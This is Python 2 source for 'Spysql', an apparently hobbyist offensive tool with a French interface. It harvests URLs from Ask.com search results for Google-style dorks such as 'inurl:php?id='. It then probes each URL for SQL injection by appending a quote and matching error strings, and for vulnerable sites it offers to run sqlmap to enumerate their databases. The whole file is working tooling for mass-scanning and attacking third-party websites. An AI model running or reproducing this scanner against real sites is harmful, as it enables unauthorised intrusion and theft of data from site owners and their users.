#!/usr/bin/pythons
"""
import requests
from bs4 import BeautifulSoup as sp
a = raw_input("enter dork : ")
b = 0
while b<100:
  try:
    r = requests.get("http://www.ask.com/web?q="+str(a)+"&page="+str(b))
  except:
    break
  
  m = str(r.text)
  soup = sp(m)
  for i in soup.find_all("p",{"class":"web-result-url"}):
      print i.text
  b+=1
  """
import os,sys
try:
  from bs4 import BeautifulSoup as sp
except:
  print ("Vous devez installer bs4 \npip install google")
  t = raw_input("Installer  google (oui|non) : ")
  if t=="oui":
     os.system("pip install bs4")
  else:
     pass
  exit()
import re,time
if re.search("2.7",sys.version):
  pass
else:
  print("Ce script marche avec python 2.7 uniquement")
  exit()
import requests,urllib2
def menu(l):
 men = """
	======{_____________________}=======
	          | Spysql v1.2 |
	     --------------------------
	      | \033[1;91mby Enokas - H4ckT3ur\033[0m|
              ______________________
        ====={       \033[91m2016522100\033[0m     }=======
 """
 men = men.replace("Spysql v1.2","\033[92mSpysql v1.2")
 helps ="""
 
 --dork          : pour inserer un dork (voir liste
 	                 avec --dork-list
 --scan-sql      : lancer la recherche de site vulnerable
                   apres la recuperation des urls avec --dork
 --inject or -i  : Verifie si un sire est vulnerable a partir d'une 
                   url donne
 --dork-list      : Affiche une list de dork
 --help          : Affiche les options
Exemple:
 - python spysql.py --dork [dork] [limit]
   + python spysql.py --dork inurl:php?id= 20
 - python spysql.py --scan-sql
 - python spysql.py --inject [url]
   + python spysql.py --inject http://example.com/index.php?id=2
   
 """
 if l==0:
    os.system("clear")
    print (men)
    print (helps)
 elif l==1:
    os.system("clear")
    print (men)
 elif l==2:
    os.system("cat dork-list.txt")
def analysis():#Analyse des urls
  menu(1)
  print"\033[1;94m[Analyse]=======================>\033[0m"
  fi = open("vuln.txt","w")
  wlist = open("page.html","r").readlines()
  tries=0
  start=time.time()
  for word in wlist:
     a =""
     word = word.replace("\n","")
     url = word+"'"
     try:
      data = urllib2.urlopen('http://'+url).read(128)
      while 1:
            if re.search('Database',data) or re.search('MySQL',data) or re.search('database',data) or re.search('sql',data) or re.search("You have",data) or re.search('erreur',data) or re.search('error',data) or re.search('mysql_numrows',data) or re.search('Error',data):
               print(bcolors.FAIL+"[Vuln]-["+bcolors.FAIL+word+"]"+bcolors.ENDC+"")
               print ("-"*74)
               fi.write(word+"\n")
               break
            else:
               print(bcolors.WARNING+"[Safe]["+word+"]"+bcolors.ENDC+"")
               print ("-"*74)
               break
     except KeyboardInterrupt,e:
      print str(e)
      pass         
def dork():#Recuperation des urls
  menu(1)
  print"\033[94m[INFO]Rechercher lance\033[0m"
  a = 0
  b = 0
  c = sys.argv[2]
  page1 = open("page.html","w")
  try:
   while a<100:
    try:
      r = requests.get("http://www.ask.com/web?q="+str(c)+"&page="+str(a))
    except IOError,e:
      print str(e)
      break
    print str(b)
    m = str(r.text)
    soup = sp(m)
    for i in soup.find_all("p",{"class":"web-result-url"}):
       lien=  i.text
       try:
         page1.write(lien+"\n")
       except:
         pass
       print "[\033[92m"+str(b)+"\033[0m]--> "+str(lien)
       b+=1
    a+=1
  except IOError,e:
    print (bcolors.FAIL+"Stoped\033[0m\n"+str(e) )      
    
def inject():#Test de vuln d'une url
    url = sys.argv[2]
    url = url+"\'"
    data = urllib2.urlopen(url).read(128)
    print (bcolors.OKGREEN+"[INFO]Analyse en cours\033[0m")
    if re.search('Database',data) or re.search('MySQL',data) or re.search('database',data) or re.search('sql',data) or re.search("You have",data) or re.search('erreur',data) or re.search('error',data) or re.search('mysql_numrows',data) or re.search('Error',data):
         print (bcolors.FAIL+"[INFO]Vulnerable\033[0m")
         t = raw_input(bcolors.WARNING+"[INFO]voulez lancer sqlmap ?(o/n) : \033[0m")
         if t=="n":
            pass
         elif t =="o":
            os.system("sqlmap -u "+url+" --dbs")
         else:
            pass
    else:
         print (bcolors.OKGREEN+"[INFO]Non Vulnerable\033[0m")
class bcolors:#definition des couleurs
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
try:
 choix = sys.argv[1]
except IOError,e:
  print str(e)
  menu(0)
if choix=="--dork":
  dork()
elif choix=="--scan-sql":
  analysis()
elif choix=="-i" or choix=="--inject":
  inject()
elif choix =="--help":
  menu(1)
elif choix =="--dork-list":
  menu(2)

